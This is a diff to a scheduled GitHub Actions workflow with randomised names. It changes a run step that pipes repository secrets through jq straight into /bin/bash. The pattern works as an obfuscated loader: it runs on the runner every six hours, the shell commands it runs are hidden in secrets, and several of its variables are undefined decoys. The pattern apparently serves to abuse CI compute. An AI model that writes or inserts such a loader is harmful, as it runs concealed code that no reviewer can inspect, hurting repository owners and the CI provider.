@@ -2,8 +2,7 @@ name: zhongxiaoyan3456
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 0/6 * * *'
-
+    - cron: '33 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,14 +10,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhongxiaoyan3456
         env:
-          dfpc53959: ${{ secrets.dfpc53959 }}
+          gskse80172: ${{ secrets.gskse80172 }}
         run: |
-          echo $dfpc53959 | jq -r .yzdsw15722 | /bin/bash
-          echo $kjhdf944 | jq -r .dy131 | /bin/bash
-          echo $myc590 | jq -r .jsmq02 | /bin/bash
-          echo $jr894 | jq -r .yxnhl128 | /bin/bash
-          echo $c6541 | jq -r .fcjuk76003 | /bin/bash
-          echo $v5776 | jq -r .nlizk7068 | /bin/bash
-          echo $spo2 | jq -r .eys4885 | /bin/bash
-          echo $eyboz9 | jq -r .bu510 | /bin/bash
+          echo $gskse80172 | jq -r .y5 | /bin/bash
+          echo $fqth97 | jq -r .zvt36851 | /bin/bash
+          echo $sgye81035 | jq -r .z8678 | /bin/bash
+          echo $uzihe94 | jq -r .i763 | /bin/bash
+          echo $dcvyg6 | jq -r .cbnha08423 | /bin/bash
+          echo $i1714 | jq -r .bpl5135 | /bin/bash
+          echo $vvoqo1 | jq -r .sldgi828 | /bin/bash
+          echo $tmlig948 | jq -r .smzz584 | /bin/bash
+          echo $cyeao88085 | jq -r .zh00348 | /bin/bash
 
